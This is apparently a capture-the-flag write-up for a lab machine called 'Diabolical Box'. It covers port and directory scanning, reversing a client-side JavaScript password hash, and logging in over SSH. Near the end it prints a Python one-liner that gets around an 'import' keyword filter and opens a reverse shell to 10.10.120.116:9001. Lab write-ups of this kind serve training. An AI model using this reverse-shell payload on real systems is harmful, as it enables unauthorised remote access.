# CTF: Diabolical Box

![Difficulty: Hard](https://img.shields.io/badge/difficulty-hard-%23ff0000)
![Contest Date: 2024-05-14](https://img.shields.io/badge/contest%20date-2024--05--14-informational)
![Category: FTP, Hash, Crontab, SSH Key](https://img.shields.io/badge/category-ftp,hash,crontab,sshkey-%237159c1)
![By: Alexandre & Eloi](https://img.shields.io/badge/by-Alexandre-%23f9a03c)  
![alt text](img/diabolicalbox.png)
## Description

> Every puzzle has an answer!

## Write-up

UserFlag: user.txt  
RootFlag: root.txt

## Flag Solutions

### User Flag

First thing to do is to check open ports on the target machine. We can do this by running a port scan using `nmap`.

```bash
nmap -sSV $IP
```

Results : 
```bash
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    nginx 1.14.0 (Ubuntu)

MAC Address: 02:85:B5:9A:69:1F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have two open ports, 22 and 80. Let's check the web server on port 80.

```bash
http://$IP
```

We arrived on a page, we can `gobuster` the website to find hidden directories.

```bash
gobuster dir --url http://<IP> -w Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,htm,js
````

Results : 
```bash
/index.html (Status: 200)
/login.html (Status: 200)
/signup.html (Status: 200)
/admin.html (Status: 200)
```

We can go to the `/admin.html` page.

```bash
http://$IP/admin.html
```

In the source code we have a `<script>...</script>` who contains a logic for the form, who check a hashed password.
And redirect to the `/very-intricate-puzzle.html'

We have the fonctions to hash the password.

But we need to reverse the hash to get the password with functions write in the script.

```JAVASCRIPT
const letters = [];
const hashed = [];
const token = "<HASH>";
let decodedMessage = "";

// Majuscule
for (let i = 0; i < 26; i++) {
    let letter = String.fromCharCode(65 + i);
    letters.push(letter)
}

// Minuscule
for (let i = 0; i < 26; i++) {
    let letter = String.fromCharCode(97 + i);
    letters.push(letter)
}
console.log(letters)

letters.forEach((e) => {
    hashed.push({letter: e, hash: int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(e))))})
});
console.log(hashed)

for (let i = 0; i < token.length; i += 4) {
    let segment = token.substring(i, i + 4);
        
    let found = hashed.find(item => item.hash === segment);
    
    if (found) {
        decodedMessage += found.letter;
    }
}

console.log(decodedMessage);

function string_to_int_array(str){
  const intArr = [];

  for(let i=0;i<str.length;i++){
    const charcode = str.charCodeAt(i);
    const partA = Math.floor(charcode / 26);
    const partB = charcode % 26;

    intArr.push(partA);
    intArr.push(partB);
  }

  return intArr;
}

function int_array_to_text(int_array){
  let txt = '';
  
  for(let i=0;i<int_array.length;i++){
    txt += String.fromCharCode(97 + int_array[i]);
  }

  return txt;
}
```

We can connect to the SSH server with the username and the password we found.

```bash
ssh <USERNAME>@$IP
```

We can find the start of the user flag.

```bash
EPI{............_
```

But now we need to the end of the user flag.
On the url http://<IP>/very-intricate-puzzle.html we have input and result.

We can write python script in the input like this.

```
print("a")
```

And we have the result `The answer to your riddle seems to be: a`

We can't use "import", "exec" and more. It's protected.
We have result : `Hmm it seems this puzzle is protected...`

We can use reverse shell to get the user flag.

```bash
a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.10.120.116",9001));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash")
```

We have the end of the user flag.

**Well done! You found the user flag!**
